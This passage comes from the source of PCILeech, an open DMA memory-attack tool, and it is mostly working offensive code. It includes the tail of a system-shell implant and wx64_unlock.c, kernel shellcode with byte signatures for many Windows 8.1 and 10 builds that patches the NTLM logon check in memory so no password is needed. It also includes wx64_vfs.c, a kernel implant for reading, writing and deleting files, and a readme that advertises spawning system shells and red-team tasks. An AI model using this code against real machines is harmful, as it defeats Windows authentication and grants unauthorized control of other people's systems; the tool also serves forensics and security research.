        ctx->fn.CreatePipe(&ctx->hInReadCP, &ctx->hInWrite, &sa, 0x800);
        ctx->fn.CreatePipe(&ctx->hOutRead, &ctx->hOutWriteCP, &sa, 0x800);
        ctx->fThreadIsActive = 1;
    }
    // create process
    if(!UserShellExec(ctx)) {
        UserShellCleanup(ctx);
        ctx->fStatus = 0xff;
        return;
    }
    // Initalize console redirection #2/2
    if(ctx->fEnableConsoleRedirect) {
        ctx->fn.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&UserShellThreadWriter, ctx, 0, NULL);
        ctx->fn.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&UserShellThreadReader, ctx, 0, NULL);
    }
    ctx->fStatus = 0xff;
}

```

`pcileech_shellcode/wx64_unlock.c`:

```c
// wx64_unlock.c : kernel code to remove the password requirement when logging on to Windows.
//
// (c) Ulf Frisk, 2016-2020
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with (normal mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_common_a.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "WINDOWS UNLOCKER - REMOVE PASSWORD REQUIREMENT!                \n===============================================================\nREQUIRED OPTIONS:                                              \n  -0   : Set to one (1) in order to unlock.                    \n         Example: '-0 1'.                                      \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) =================%s\nNTSTATUS        : 0x%08X  \n===============================================================\n"
//
// compile with (standalone [8051] mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_unlock_standalone.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "DUMMY"
//
#include "wx64_common.h"

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct _IDT_DESCRIPTOR {
	DWORD dwOpaque1;
	QWORD qwAddressISR;
	DWORD dwOpaque2;
} IDT_DESCRIPTOR, *PIDT_DESCRIPTOR;

typedef struct _IDTR {
	WORD nBytes;
	PIDT_DESCRIPTOR pIDT_DESCRIPTOR;
} IDTR, *PIDTR;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

//----------------------------------------------------------------------------------------------------------

#undef RtlCompareMemory
#undef RtlCopyMemory
typedef struct tdKERNEL_FUNCTIONS2 {
	VOID(*ExFreePool)(
		_In_ PVOID P);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	SIZE_T(*RtlCompareMemory)(
		_In_ const VOID   *Source1,
		_In_ const VOID   *Source2,
		_In_       SIZE_T Length
		);
	VOID(*RtlCopyMemory)(
		_Out_ VOID UNALIGNED *Destination,
		_In_ const VOID UNALIGNED *Source,
		_In_ SIZE_T Length
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->ExFreePool,							H_ExFreePool },
		{ &fnk2->MmGetPhysicalAddress,					H_MmGetPhysicalAddress },
		{ &fnk2->MmGetPhysicalMemoryRanges,				H_MmGetPhysicalMemoryRanges },
		{ &fnk2->MmMapIoSpace,							H_MmMapIoSpace },
		{ &fnk2->MmUnmapIoSpace,						H_MmUnmapIoSpace },
		{ &fnk2->RtlCompareMemory,						H_RtlCompareMemory },
		{ &fnk2->RtlCopyMemory,							H_RtlCopyMemory }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

typedef struct tdSignatureChunk {
	WORD cbOffset;
	BYTE cb;
	BYTE pb[6];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
	// in unlock mode: 
	//   chunk[0] = signature chunk 1 (required) 
	//   chunk[1] = signature chunk 2 (optional)
	//   chunk[2] = patch chunk (required)
	SIGNATURE_CHUNK chunk[3];
} SIGNATURE, *PSIGNATURE;

//----------------------------------------------------------------------------------------------------------

NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures)
{
	PBYTE pb;
	DWORD pgIdx, i;
	PSIGNATURE ps;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			if(!ps->chunk[0].cb || (ps->chunk[0].cb != fnk2->RtlCompareMemory(pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, ps->chunk[0].cb))) {
				continue;
			}
			if(ps->chunk[1].cb && (ps->chunk[1].cb != fnk2->RtlCompareMemory(pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, ps->chunk[1].cb))) {
				continue;
			}
			fnk2->RtlCopyMemory(pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, ps->chunk[2].cb);
			return S_OK;
		}
	}
	return E_FAIL;
}

#define NUMBER_OF_SIGNATURES 15
NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
{
	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
		// win8.1x64 msv1_0.dll (2014-10-29)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x42, 0xA4 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0x46, 0x88 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2015-10-30)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0xC2, 0x07 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xCE, 0xBC } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2016-03-16)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x22, 0x04 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xB2, 0xB9 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2015-07-10)/10.0.10240.16384]
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xff, 0x15, 0x4b, 0x1c } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2015-10-30)/10.0.10586.0]
		{ .chunk = {
			{ .cbOffset = 0x62f,.cb = 4,.pb = { 0xff, 0x15, 0xb3, 0x1b } },
			{ .cbOffset = 0x638,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x638,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2016-07-16)/10.0.14393.0]
		{ .chunk = {
			{ .cbOffset = 0x6df,.cb = 4,.pb = { 0xff, 0x15, 0xd3, 0x1b } },
			{ .cbOffset = 0x6e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x6e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-02-06)/10.0.14393.2791]
		{.chunk = {
			{.cbOffset = 0x6f5,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x18 } },
			{.cbOffset = 0x6fb,.cb = 5,.pb = { 0x0FB, 0xFF, 0xFF, 0xB8, 0x01 } },
			{.cbOffset = 0x6f9,.cb = 1,.pb = { 0x84 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
		{ .chunk = {
			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-09-30)/10.0.15063.2106]
		{.chunk = {
			{.cbOffset = 0x625,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
			{.cbOffset = 0x62e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{.cbOffset = 0x62e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2017-09-29)/10.0.16299.15]
		{ .chunk = {
			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xd5, 0x1c } },
			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2018-04-11)/10.0.17134.1]
        { .chunk = {
            { .cbOffset = 0x695,.cb = 4,.pb = { 0xff, 0x15, 0x55, 0x1c } },
            { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
            { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
        },
		// Windows 10 x64 [NtlmShared.dll (2019-10-02)/10.0.17134.1067]
		{.chunk = {
			{.cbOffset = 0x6ab,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x2E } },
			{.cbOffset = 0x6b1,.cb = 5,.pb = { 0xFB, 0xFF, 0xFF, 0xB0, 0x01 } },
			{.cbOffset = 0x6af,.cb = 1,.pb = { 0x84 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
		{.chunk = {
			{.cbOffset = 0x740,.cb = 4,.pb = { 0xff, 0x15, 0xb2, 0x1b } },
			{.cbOffset = 0x749,.cb = 4,.pb = { 0x0f, 0x84, 0x0b, 0xfb } },
			{.cbOffset = 0x749,.cb = 2,.pb = { 0x0f, 0x85 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-03-19)/10.0.18362.1]
		// Windows 10 x64 [NtlmShared.dll (2019-10-06)/10.0.18362.418]
		{.chunk = {
			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
			{.cbOffset = 0x741,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-12-07)/10.0.19041.1]
		{.chunk = {
			{.cbOffset = 0x426,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0x53, 0x20 } },
			{.cbOffset = 0x435,.cb = 6,.pb = { 0x0f, 0x84, 0xba, 0xfa, 0xff, 0xff } },
			{.cbOffset = 0x435,.cb = 2,.pb = { 0x0f, 0x85 } } }
		}
	};
	KERNEL_FUNCTIONS2 fnk2;
	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
	SIZE_T i, cMemMap;
	QWORD qwBaseAddress = 0;
	PVOID pvMemory;
	NTSTATUS nt;
	// 1: Intialize function table
	InitializeKernelFunctions2(qwAddrNtosBase, &fnk2);
	// 2: Retrieve physical memory map
	pMemMap = fnk2.MmGetPhysicalMemoryRanges();
	if(pMemMap == NULL) {
		return E_FAIL;
	}
	for(cMemMap = 0; pMemMap[cMemMap].BaseAddress || pMemMap[cMemMap].NumberOfBytes; cMemMap++);
	// 3: Search memory and unlock if signature is found
	while(qwBaseAddress + 0x10000 <= pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes) {
		for(i = 0; i < cMemMap; i++) {
			pMM = &pMemMap[i];
			if(((pMM->BaseAddress < qwBaseAddress) && (pMM->BaseAddress + pMM->NumberOfBytes > qwBaseAddress + 0x10000))) {
				// is inside range!
				pvMemory = fnk2.MmMapIoSpace(qwBaseAddress, 0x10000, 0);
				if(pvMemory) {
					nt = Unlock_FindAndPatch(&fnk2, pvMemory, 0x10000 / 0x1000, oSigs, NUMBER_OF_SIGNATURES);
					fnk2.MmUnmapIoSpace(pvMemory, 0x10000);
					if(NT_SUCCESS(nt)) {
						// found and patched! - exit!
						goto cleanup;
					}
				}
				break;
			}
		}
		qwBaseAddress += 0x10000;
	}
	nt = E_FAIL;
cleanup:
	fnk2.ExFreePool(pMemMap);
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	if(pk->dataIn[0] == 1) {
		pk->dataOut[0] = (QWORD)Unlock(pk->AddrKernelBase);
	} else {
		pk->dataOut[0] = ERROR_INVALID_PARAMETER;
	}
}
```

`pcileech_shellcode/wx64_vfs.c`:

```c
// wx64_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_vfs.c
// ml64 wx64_common_a.asm /Fewx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_vfs.obj wx64_common.obj
// shellcode64.exe -o wx64_vfs.exe
// 
#include "wx64_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG	NextEntryOffset;
	ULONG	FileIndex;
	QWORD	CreationTime;
	QWORD	LastAccessTime;
	QWORD	LastWriteTime;
	QWORD	ChangeTime;
	QWORD	EndOfFile;
	QWORD	AllocationSize;
	ULONG	FileAttributes;
	ULONG	FileNameLength;
	ULONG	EaSize;
	CCHAR	ShortNameLength;
	WCHAR	ShortName[12];
	WCHAR	FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

NTSTATUS VfsWrite(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt;
	HANDLE hFile = 0;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	UNICODE_STRING _su;
	ULONG CreateDisposition;
	ACCESS_MASK DesiredAccess;
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	DesiredAccess = (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? FILE_APPEND_DATA : GENERIC_WRITE;
	CreateDisposition = ((pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) && (0 == pop->offset)) ? FILE_OVERWRITE_IF : FILE_OPEN;
	nt = fnk->ZwCreateFile(&hFile, DesiredAccess, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, CreateDisposition, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(nt) { goto cleanup; }
	nt = fnk->ZwWriteFile(hFile, NULL, NULL, NULL, &_io, pop->pb, (DWORD)pop->cb, (PLARGE_INTEGER)&pop->offset, 0);
cleanup:
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsRead(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	NTSTATUS nt;
	HANDLE hFile = 0;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	UNICODE_STRING _su;
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(nt) { goto cleanup; }
	nt = fnk->ZwReadFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataOutExtraOffset), (ULONG)pop->cb, &pop->offset, 0);
	if(nt) { goto cleanup; }
	pk->dataOutExtraLength = (QWORD)_io.Information;
cleanup:
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsList(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	NTSTATUS nt = 0;
	HANDLE hFileFind = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	PVFS_RESULT_FILEINFO pfi;
	PFILE_BOTH_DIR_INFORMATION pdi;
	QWORD cfi = 0, cfiMax;
	BOOLEAN isRestartScan = TRUE;
	if(pk->dataOutExtraLengthMax < 0x00200000) { return STATUS_FAIL_OUTOFMEMORY; }
	pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset);
	cfiMax = (pk->dataOutExtraLengthMax - 0x00100000) / sizeof(VFS_RESULT_FILEINFO);
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwOpenFile(&hFileFind, FILE_LIST_DIRECTORY | SYNCHRONIZE, &_oa, &_io, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT | 1 /*FILE_DIRECTORY_FILE*/ | 0x4000 /*FILE_OPEN_FOR_BACKUP_INTENT*/);
	if(nt) { goto cleanup; }
	while(TRUE) {
		pdi = (PFILE_BOTH_DIR_INFORMATION)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLengthMax - 0x00100000);
		nt = fnk->ZwQueryDirectoryFile(hFileFind, NULL, NULL, NULL, &_io, pdi, 0x00100000, 3 /*FileBothDirectoryInformation*/, FALSE, NULL, isRestartScan);
		isRestartScan = FALSE;
		if(nt || (0 == _io.Information)) { goto cleanup; }
		while(TRUE) {
			fnk->RtlZeroMemory(pfi, sizeof(VFS_RESULT_FILEINFO));
			pfi->cb = pdi->EndOfFile;
			pfi->tAccessOpt = pdi->LastAccessTime;
			pfi->tCreateOpt = pdi->CreationTime;
			pfi->tModifyOpt = pdi->ChangeTime;
			pfi->flags |= VFS_FLAGS_UNICODE;
			pfi->flags |= (pdi->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? VFS_FLAGS_FILE_DIRECTORY : VFS_FLAGS_FILE_NORMAL;
			fnk->RtlCopyMemory(pfi->wszFileName, pdi->FileName, min(MAX_PATH - 1, pdi->FileNameLength));
			pfi++;
			cfi++;
			if(cfi >= cfiMax) { goto cleanup; }
			if(0 == pdi->NextEntryOffset) { break; }
			pdi = (PFILE_BOTH_DIR_INFORMATION)((QWORD)pdi + pdi->NextEntryOffset);
		}
	}
cleanup:
	pk->dataOutExtraLength = cfi * sizeof(VFS_RESULT_FILEINFO);
	if(hFileFind) { fnk->ZwClose(hFileFind); }
	return cfi ? 0 : nt;
}

NTSTATUS VfsCreate(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt = 0;
	HANDLE hFile = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsDelete(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt = 0;
	HANDLE hFile = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_WRITE, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, 0x00001000/*FILE_DELETE_ON_CLOSE*/, NULL, 0);
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	PVFS_OPERATION pop;
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC)) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, fnk, pop);
		return;
	}
}

```

`readme.md`:

```md
PCILeech Summary:
=================
PCILeech uses PCIe hardware devices to read and write target system memory. This is achieved by using DMA over PCIe. No drivers are needed on the target system. 

<b>PCILeech also works without hardware together with a wide range of software memory acqusition methods supported by the LeechCore library - including capture of remote live memory using DumpIt or WinPmem. PCILeech also supports local capture of memory and a number of memory dump file formats.</b>

PCILeech supports multiple memory acquisition devices. Both hardware and software based. USB3380 based hardware is only able to read 4GB of memory natively, but is able to read all memory if a kernel module (KMD) is first inserted into the target system kernel. FPGA based hardware, and software based methods, are able to read all memory.

PCILeech is capable of inserting a wide range of kernel implants into the targeted kernels - allowing for easy access to live ram and the file system via a "mounted drive". It is also possible to remove the logon password requirement, loading unsigned drivers, executing code and spawn system shells. PCIleech runs on Windows and Linux. Supported target systems are currently the x64 versions of: UEFI, Linux, FreeBSD and Windows. This requires write access to memory (USB3380 hardware, FPGA hardware, LiveCloudKd or CVE-2018-1038 "Total Meltdown").

<b>To get going clone the sources in the repository or download the latest [binaries, modules and configuration files](https://github.com/ufrisk/pcileech/releases/latest).</b>

The [PushPin GUI frontend](https://github.com/LuckyPi/PushPin) for PCILeech makes common RedTeam tasks super easy. Note that PushPin is not part of the official PCILeech distribution.

<img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_mbp.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_m2.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_shadow.jpg" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/2df37be67047e19ea2c3f73be67a0ba06fea203d/_gh_dump.gif" height="150"/><img src="https://gist.githubusercontent.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/ab5032dac2600acf1480d81ac265b66fecaaa9b2/_gh_ac701_pcileech_main.jpg" height="150"/><img src="https://gist.github.com/ufrisk/c5ba7b360335a13bbac2515e5e7bb9d7/raw/ab5032dac2600acf1480d81ac265b66fecaaa9b2/_gh_pciescreamer_pcileech_main.jpg" height="150"/><img src="https://raw.githubusercontent.com/LuckyPi/PushPin/master/pushpin_description.PNG" height="150"/>


Capabilities:
=============
* Retrieve memory from the target system at >150MB/s.
